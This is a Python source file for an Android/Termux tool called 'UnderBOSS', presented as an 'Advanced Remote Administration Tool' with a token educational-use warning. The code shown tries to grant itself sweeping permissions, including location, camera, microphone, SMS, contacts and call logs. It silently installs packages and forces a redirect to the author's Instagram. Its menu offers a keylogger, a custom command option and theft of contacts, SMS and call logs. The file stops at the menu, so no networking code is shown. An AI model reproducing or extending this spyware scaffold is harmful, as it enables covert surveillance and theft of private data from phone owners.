#!/usr/bin/env python3

import socket
import subprocess
import sys
import time
import random
import os
import threading
import json
import re

try:
    import netifaces
except ImportError:
    os.system("pip install netifaces 2>/dev/null")
    import netifaces

RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"

TOOL_NAME = "UnderBOSS"
AUTHOR = "SYLHETYHACKVENGER (THE-ERROR808)"
TITLE = "Advanced Remote Administration Tool"
WARNING = "⚠️ FOR EDUCATIONAL PURPOSES ONLY! Unauthorized use is ILLEGAL!"

def termux_cmd(command, args=None, timeout=10):
    try:
        if args:
            result = subprocess.run([command] + args, capture_output=True, text=True, timeout=timeout)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", -1
    except FileNotFoundError:
        return "", f"Command {command} not found. Install termux-api package.", -1
    except Exception as e:
        return "", str(e), -1

def check_permissions():
    print(f"{YELLOW}[*] Checking Termux-API installation...{RESET}")
    try:
        result = subprocess.run(["termux-tts-speak", "--help"], capture_output=True, timeout=2)
        print(f"{GREEN}[+] Termux-API is installed{RESET}")
    except:
        print(f"{RED}[-] Termux-API not found! Installing...{RESET}")
        os.system("pkg install termux-api -y")
    
    print(f"{YELLOW}[*] Requesting permissions...{RESET}")
    permissions = [
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.CAMERA",
        "android.permission.RECORD_AUDIO",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_PHONE_STATE",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.CALL_PHONE"
    ]
    
    for perm in permissions:
        try:
            stdout, stderr, code = termux_cmd("termux-permission", ["grant", perm], timeout=5)
            if code == 0:
                print(f"{GREEN}[+] Granted: {perm}{RESET}")
            else:
                print(f"{YELLOW}[!] Could not grant: {perm}{RESET}")
        except:
            pass
    
    print(f"{GREEN}[+] Permission check complete{RESET}\n")

def get_all_ips():
    ips = []
    try:
        for interface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    if addr['addr'] != '127.0.0.1':
                        ips.append((interface, addr['addr']))
    except:
        try:
            result = subprocess.check_output(["ip", "addr"], stderr=subprocess.DEVNULL).decode()
            for line in result.split('\n'):
                if 'inet ' in line and '127.0.0.1' not in line:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        ip = parts[1].split('/')[0]
                        iface = parts[-1] if len(parts) > 2 else 'unknown'
                        ips.append((iface, ip))
        except:
            pass
    
    if not ips:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            ips.append(('default', ip))
        except:
            ips.append(('localhost', '127.0.0.1'))
    
    return ips

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def lock_and_redirect():
    print(f"{CYAN}📱 Follow My Instagram: @shv.cyberlab{RESET}")
    print(f"{CYAN}Redirecting to Instagram...{RESET}\n")
    time.sleep(1)
    
    for i in range(5, 0, -1):
        sys.stdout.write(f"\r{BOLD}{MAGENTA}⏳ Redirecting in: {i}...{RESET}")
        sys.stdout.flush()
        time.sleep(1)
    print("\n")
    
    url = "https://instagram.com/shv.cyberlab"
    instagram_pkg = "com.instagram.android"
    
    try:
        if sys.platform == "linux" and "com.termux" in os.environ.get("PREFIX", ""):
            try:
                subprocess.run(["termux-open", url], timeout=7, capture_output=True)
                return
            except:
                pass
            
            try:
                subprocess.Popen([
                    "am", "start",
                    "-a", "android.intent.action.VIEW",
                    "-d", url,
                    "-p", instagram_pkg
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(1)
                return
            except:
                pass
            
            try:
                subprocess.Popen([
                    "am", "start",
                    "-a", "android.intent.action.VIEW",
                    "-d", url
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return
            except:
                pass
            
            try:
                subprocess.run(["termux-open-url", url], timeout=7, capture_output=True)
                return
            except:
                pass
            
            try:
                subprocess.Popen(["xdg-open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return
            except:
                pass
            
            print(f"\n{YELLOW}⚠️ Could not open automatically. Open this URL manually:{RESET}")
            print(f"{GREEN}https://instagram.com/shv.cyberlab{RESET}")
            
        elif sys.platform == "win32":
            try:
                os.system(f"start {url}")
            except:
                os.system(f"start microsoft-edge:{url}")
        else:
            try:
                subprocess.Popen(["xdg-open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                subprocess.Popen(["open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
    except Exception as e:
        print(f"{YELLOW}⚠️ Could not open Instagram automatically{RESET}")
        print(f"{GREEN}🔗 Manual link: https://instagram.com/shv.cyberlab{RESET}")

def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠈⠄⡢⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣀⣀⣀⣀⣀⣤⣄⣀⠀⠀⠀⠀⠀⠀⠊⠓⣂⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⢫⠽⣗⡟⣷⣻⢿⡷⢾⣿⣿⣻⣿⣿⣿⣶⣴⣠⠀⠀⠀⠐⠠⠠⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢈⠖⠊⢢⢢⣫⠦⢧⠳⠸⠑⢻⢙⣊⣽⢳⣹⣿⣿⣿⣿⣶⣀⠀⠀⠐⠈⢡⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⡈⠀⠁⠃⠋⡌⡘⠀⠈⠸⢈⠈⢇⢻⠜⣿⣼⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠄⢠⣶⡀⠀⢐⡤⢄⣄⣷⣧⣤⣴⣄⣓⣠⡘⣄⣼⣾⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⡦⠛⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠈⠃⠈⢙⠏⣷⠂⠀⠙⠱⠿⣟⣿⢿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣿⢮⠓⠀⠠⢂⠈⠱⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠈⠃⠀⠈⠀⠈⠀⠀⠉⠃⠁⠘⠋⠛⣻⣿⣿⣽⣳⣵⠑⠀⣀⠑⠢⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠈⠛⣿⣿⣿⣗⢗⠀⠀⠰⠊⠢⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡆⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠨⠚⣾⣿⣿⠕⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢴⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠐⠔⢝⣻⣿⣎⠀⠀⡐⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠒⣏⣿⣞⠁⠀⠀⠀⠐⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣸⣿⣿⡟⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠠⣱⣺⣿⣧⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⠙⠛⣿⣿⣾⣷⡿⢿⡿⠀⠀⠘⢆⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠾⣾⣷⣴⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠨⡰⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠐⢋⠻⣿⣇⠁⠻⡱⠀⢰⣎⡮⡋⣴⣤⣤⣀⠤⡄⠀⠚⣥⢛⣿⢾⡿⣿⣿⡟⠀⠀⠀⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠈⠈⠏⠳⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠟⡆⠁⠁⠀⠙⠀⠜⠙⣽⢯⠟⣷⡷⢜⣆⠀⠉⢮⠌⣛⣝⡟⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠸⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣇⠀⠀⠀⢀⠄⠈⠀⠀⡀⠉⠈⣉⠃⠝⢁⠀⠈⢂⠢⢻⡻⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⣝⠻⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢐⠆⣿⡽⣷⠀⠈⢀⠀⠀⡀⢀⠀⠀⠀⠁⠀⠀⡀⡆⠀⠈⡀⡨⢮⡃⠀⠀⠀⠀⠀⠀⠀⠀⣀⣄⣀⣀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠲⢀⠀⠀⠈⠐⠈⠑⡏⠓⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠁⡀⠀⠰⠘⠑⠀⠀⠀⠀⠀⣶⡖⣱⠘⠉⠋⠉⠙⢷⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢦⡀⠰⣀⠀⢀⠸⣄⠈⢀⣀⠀⠈⡀⠀⠀⠀⠀⠀⠠⡠⢀⡀⠀⢀⠀⠀⠀⠀⠀⠈⣿⠴⠉⠀⠀⠀⠈⡆⠀⡇⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠴⡀⢀⠀⠈⠀⠂⡁⠀⠀⢩⣤⠚⡄⣀⣌⠠⣄⡠⢀⠁⢀⠀⡂⢠⢡⠀⠈⠀⠀⠀⢀⣼⠘⣰⠘⠘⠀⠀⠀⢀⠐⠀⠿⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠔⣢⢤⠀⠀⠀⠠⠀⢘⠆⠁⠌⡓⡰⠢⠄⣈⡂⡑⠠⠁⠑⢪⠥⠆⡀⠀⢀⡤⢾⢁⠰⠿⠂⠀⢀⠀⠀⠀⣦⢠⠇⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠄⠀⠐⢁⢂⣂⢄⡪⠓⢠⠀⠌⠂⡈⠢⠤⡀⠋⠱⠊⡢⢔⡀⠘⣿⠃⢢⠡⣄⠐⣄⠨⠦⣀⡼⣫⠏⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⢴⣴⣦⣄⠀⠀⠀⠈⠀⠀⠉⢁⣀⢡⠆⣩⠀⠒⠡⡼⠠⠁⢛⢄⢎⠢⣅⠁⡔⣑⣳⠀⠀⠀⢸⡷⣾⣿⣿⣗⣉⡤⠞⠁⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠙⠛⢿⣿⣿⣷⠦⡀⡀⠀⠀⠐⡀⠠⠀⠢⢁⠃⠈⢒⡩⠡⣙⠊⢌⠆⠮⢠⢤⢮⢀⡸⠇⠀⠀⠈⠙⠣⠉⠍⠓⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠏⡱⠓⠌⠑⠀⠀⠄⠀⠀⠌⠁⠄⠈⡐⠆⡨⠑⠨⠚⡄⠂⠉⡄⡒⠠⠆⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠁⠀⠀⠀⠀⠁⠀⠁⠀⠀⠀⠀⠄⠀⠁⢀⠀⠀⠁⠀⠰⠀⠀⠀⠀⠀⢠⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣹⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠃⠀⠀⣀⡽⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⠊⠀⠀⠀⣔⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⣄⢖⣾⣲⣶⣼⢯⣝⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠠⠀⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠒⣉⠞⢬⣻⣛⣿⣚⣔⠷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠄⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢀⢡⡰⢖⣹⣭⣽⣶⣾⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠈⣄⣴⣾⣿⣿⣿⣿⣿⡟⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⢀⠠⢄⢊⠡⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣠⣶⣶⣾⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⡀⠄⡒⠌⡃⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⡄⠢⠑⠈⠄⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠈⠒⠈⠀⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠁⠶⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡀⠀⠀⠀⠈⢉⠛⠿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠐⠂⠈⠁⠀⠀⠀⠀⢠⣼⣿⡷⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{BOLD}{RED}                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣐⣾⢿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """)
    print(f"""
{BOLD}{MAGENTA}╔═══════════════════════════════════════════════════════════════════╗{RESET}
{BOLD}{MAGENTA}║                                                                   ║{RESET}
{BOLD}{MAGENTA}║  {GREEN}{TOOL_NAME} - {TITLE}{RESET}
{BOLD}{MAGENTA}║  {CYAN}Author: {AUTHOR}{RESET}
{BOLD}{MAGENTA}║  {YELLOW}{WARNING}{RESET}
{BOLD}{MAGENTA}║                                                                   ║{RESET}
{BOLD}{MAGENTA}╚═══════════════════════════════════════════════════════════════════╝{RESET}
    """)
    print(f"{BOLD}{MAGENTA}┃ {CYAN}Instagram: {YELLOW}@shv.cyberlab{RESET}")
    print(f"{BOLD}{MAGENTA}┃ {CYAN}Status: {GREEN}Active{RESET}")
    print(f"{BOLD}{MAGENTA}╚═══════════════════════════════════════════════════════════════════╝{RESET}\n")

def show_menu():
    print(f"\n{YELLOW}╔════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║            {TOOL_NAME} REMOTE CONTROL CENTER            ║{RESET}")
    print(f"{YELLOW}╚════════════════════════════════════════════════════════╝{RESET}")
    print(f"{YELLOW}[1]{RESET} Device Intel")
    print(f"{YELLOW}[2]{RESET} Voice Alert")
    print(f"{YELLOW}[3]{RESET} Download File")
    print(f"{YELLOW}[4]{RESET} Push Popup")
    print(f"{YELLOW}[5]{RESET} List Apps")
    print(f"{YELLOW}[6]{RESET} Battery & Storage")
    print(f"{YELLOW}[7]{RESET} Device Logs")
    print(f"{YELLOW}[8]{RESET} Custom Command")
    print(f"{YELLOW}[9]{RESET} Flashlight ON")
    print(f"{YELLOW}[10]{RESET} Flashlight OFF")
    print(f"{YELLOW}[11]{RESET} Flashlight Toggle")
    print(f"{YELLOW}[12]{RESET} Flashlight Flicker (10x)")
    print(f"{YELLOW}[13]{RESET} Flashlight Flicker (Fast)")
    print(f"{YELLOW}[14]{RESET} Flashlight Flicker (Slow)")
    print(f"{YELLOW}[15]{RESET} Flashlight Disco Effect")
    print(f"{YELLOW}[16]{RESET} Flashlight SOS Signal")
    print(f"{YELLOW}[17]{RESET} Screen Flicker (10x)")
    print(f"{YELLOW}[18]{RESET} Screen Flicker (Fast)")
    print(f"{YELLOW}[19]{RESET} Screen Flicker (Slow)")
    print(f"{YELLOW}[20]{RESET} Screen Disco Effect")
    print(f"{YELLOW}[21]{RESET} Screen SOS Signal")
    print(f"{YELLOW}[22]{RESET} Screen + Flashlight Combo")
    print(f"{YELLOW}[23]{RESET} Google Search")
    print(f"{YELLOW}[24]{RESET} YouTube Search")
    print(f"{YELLOW}[25]{RESET} YouTube Trending")
    print(f"{YELLOW}[26]{RESET} Google Images")
    print(f"{YELLOW}[27]{RESET} Google News")
    print(f"{YELLOW}[28]{RESET} Search Both Google & YouTube")
    print(f"{YELLOW}[29]{RESET} Search History")
    print(f"{YELLOW}[30]{RESET} Play YouTube Video")
    print(f"{YELLOW}[31]{RESET} Keylogger Start")
    print(f"{YELLOW}[32]{RESET} Keylogger Stop")
    print(f"{YELLOW}[33]{RESET} Get Contacts")
    print(f"{YELLOW}[34]{RESET} Get SMS")
    print(f"{YELLOW}[35]{RESET} Get Call Logs")
